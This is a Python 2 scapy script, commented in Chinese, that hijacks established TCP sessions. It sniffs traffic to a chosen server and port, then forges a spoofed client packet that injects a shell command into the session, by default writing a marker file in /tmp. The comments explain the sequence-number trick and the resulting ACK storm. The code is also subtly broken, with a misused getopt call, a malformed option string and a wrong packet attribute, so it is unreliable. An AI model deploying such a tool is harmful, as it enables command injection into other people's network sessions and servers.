#!/usr/bin/env python
# coding: utf-8

"""
tcp劫持程序
"""
import sys
import getopt
from scapy.all import send, sniff, IP, TCP


dev = "eth0"
srv_port = None
srv_ip = None
client_ip = None
grep = None
inject_data = "echo 'haha' > /tmp/hacked\n"
hijack_data = {}


"""
handle_packet是程序的主函数。
我们首先检查截获的包是否包含ack或者ack和push标志，以确定这是一个已经建立好的链接。
然后检查ip地址，以确定包是从服务器发到客户端的。
这里，我们之劫持从服务器发过来的包，因为我们的主要目的是向服务器注入命令。
得到这样的包之后，我们用期望额（payload）来匹配数据包中的payload。
一旦匹配，就伪造一个从客户端回复的数据包：把ACK序号用作seq序号，再加上我们payload长度。

理论上，我们可以注入多个数据包从而占据整个连接。
客户端就将不能再使用它，或者说将会被挂起，因为它总是会发送包含低seq序号的ack包。
这有可能导致ack风暴，因为server会为每个包发送RST包，但client却一直发送老的seq序号。
我们可以自己定义一个其他函数来向客户端发送RST包来关闭连接，然后就能避免ACK风暴
"""
def handle_packet(packet):
    ip = packet.getlayer("IP")
    tcp = packet.getlayer("TCP")
    flags = tcp.sprintf("%flags%")

    print "Got packet %s:%d -> %s:%d [%s]" % (ip.src, tcp.port, ip.dst, tcp.dport, flags)
    # check if this is a hijackable packet
    if tcp.sprintf("%flags%") == "A" or tcp.sprintf("%flags%") == "PA":
        already_hijacked = hijack_data.get(ip.dst, {}).get('hijacked')
        #the packet is from server to client
        if tcp.sport == srv_port and ip.src == srv_ip and not already_hijacked:
            print "Got server sequence " + str(tcp.seq)
            print "Got client sequence " + str(tcp.ack) + "\n"
            # Found the payload?
            if grep in str(tcp.payload):
                hijack_data.setdefault(ip.dst, {})['hijack'] = True
                print "Found payload " + str(tcp.payload)
            elif not grep:
                hijack_data.setdefault(ip.dst, {})['hijack'] = True
            if hijack_data.setdefault(ip.dst, {}).get('hijack'):
                print "Hijacking %s:%d -> %s:%d" % (ip.dst, tcp.dport, ip.src, srv_port)
                # spoof packet from client
                packet = IP(src=ip.dst, dst=ip.src) /\
                        TCP(sport=tcp.dport, dport=srv_port, seq=tcp.ack + len(inject_data), ack=tcp.seq + 1,
                                flags="PA") / \
                        inject_data
                send(packet, iface=dev)
                hijack_data[ip.dst]['hijacked'] = True


def usage():
    print sys.argv[0]
    print """
    -c <client_ip>(optional)
    -d <data_to_inject>(optional)
    -g <payload_to_grep>(optional)
    -i <interface>(optional)
    -p <srv_port>
    -s <srv_ip>
    """
    sys.exit(1)


if len(sys.argv) < 5:
    usage()
    sys.exit(1)

try:
    cmd_opts = "c:d:g:i:p:s"
    opts, args = getopt.GetoptError(sys.argv[1], cmd_opts)
except getopt.GetoptError:
    usage()

for opt in opts:
    if opt[0] == "-c":
        client_ip = opt[1]
    elif opt[0] == "-d":
        inject_data = opt[1]
    elif opt[0] == "-g":
        grep = opt[1]
    elif opt[0] == "-i":
        dev = opt[1]
    elif opt[0] == "-p":
        srv_port = int(opt[1])
    elif opt[0] == "-s":
        srv_ip = opt[1]
    else:
        usage()

if not srv_ip and not srv_port:
    usage()

if client_ip:
    print "Hijacking TCP connection from %s to %s ont port %d" % (client_ip, srv_ip, srv_port)
    filter = "tcp and port " + str(srv_port) + " and host" + srv_ip + " and host " + client_ip
else:
    print "Hijacking all TCP connection to %s on port %d" % (srv_ip, srv_port)
    filter = "tcp and port " + str(srv_port) + " and host " + srv_ip

sniff(iface=dev, store=0, filter=filter, prn=handle_packet)
